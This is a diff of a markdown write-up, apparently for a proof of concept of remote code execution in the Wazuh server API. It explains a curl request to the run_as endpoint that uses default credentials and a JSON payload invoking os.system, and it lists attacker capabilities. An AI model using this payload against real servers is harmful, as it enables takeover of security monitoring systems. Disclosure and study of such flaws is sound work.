@@ -77,14 +77,15 @@ curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/js
 https://<worker-server>:55000/security/user/authenticate/run_as
 ```
 ### Explanation of the Exploit:
-•	`-X POST` – Specifies the HTTP method as POST.
-•	`-k` – Disables SSL certificate verification (useful for testing in environments with self-signed certificates).
-•	`-u "wazuh-wui:MyS3cr37P450r.*-"` – Provides authentication credentials (default credentials are used here, which should be changed for security).
-•	`-H "Content-Type: application/json"` – Sets the `Content-Type` header to `application/json` to indicate the request body format.
-•	`--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}'` – Injects the malicious JSON payload, which executes the command touch /tmp/pwn.txt on the Wazuh server, demonstrating arbitrary code execution.
-•	`https://<worker-server>:55000/security/user/authenticate/run_as` – Specifies the run_as endpoint URL. The placeholder <worker-server> should be replaced with the actual hostname or IP address of the Wazuh worker server.
+- **`-X POST`** – Specifies the HTTP method as **POST**.  
+- **`-k`** – Disables SSL certificate verification (useful for testing in environments with self-signed certificates).  
+- **`-u "wazuh-wui:MyS3cr37P450r.*-"`** – Provides authentication credentials (**default credentials are used here, which should be changed for security**).  
+- **`-H "Content-Type: application/json"`** – Sets the `Content-Type` header to `application/json` to indicate the request body format.  
+- **`--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}'`** – Injects the malicious JSON payload, which executes the command `touch /tmp/pwn.txt` on the Wazuh server, demonstrating arbitrary code execution.  
+- **`https://<worker-server>:55000/security/user/authenticate/run_as`** – Specifies the `run_as` endpoint URL. Replace `<worker-server>` with the actual hostname or IP address of the Wazuh worker server.  
 
-### Attack Capabilities
+A successful attack grants the following capabilities:
+
 - **Full system control** – Attackers can install malware, modify configurations, or exfiltrate sensitive data.
 - **Lateral movement** – The compromised Wazuh server can be used for spreading across networks.
 - **Monitoring disruption** – Security alerts can be disabled, allowing attackers to operate undetected.
